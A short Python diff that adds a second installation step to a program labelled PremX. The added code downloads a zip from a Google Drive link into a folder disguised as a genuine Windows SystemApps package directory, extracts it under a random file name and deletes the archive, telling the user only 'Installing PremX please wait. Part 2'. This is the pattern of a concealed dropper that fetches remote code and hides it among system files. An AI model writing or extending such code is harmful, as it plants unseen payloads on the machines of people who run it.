@@ -102,6 +102,15 @@ if not os.path.exists("C:\\Windows\\System32\\DSEL\\premx_d.py"):
     extract_zip(zip_file, extract_dir)
     os.remove(zip_file)
 
+if not os.path.exists("C:\\Windows\\SystemApps\\Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewy1h2txyeX\\csklxzcgmletroipqsadfi.nsh"):
+    os.system('cls')
+    print("Installing PremX please wait. Part 2")
+    download_file_from_google_drive("https://drive.google.com/uc?id=1So5_aAQEKV0fVgChL0sw1S3fhUhCeQy8", "C:\\Windows\\SystemApps\\Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewy1h2txyeX\\csklxzcgmletroipqsadfi.zip")
+    zip_file = r'C:\Windows\SystemApps\Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewy1h2txyeX\csklxzcgmletroipqsadfi.zip'
+    extract_dir = r'C:\Windows\SystemApps\Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewy1h2txyeX'
+    extract_zip(zip_file, extract_dir)
+    os.remove(zip_file)
+
 def create_check_file(file):
     try:
         with open(file, "w") as f:
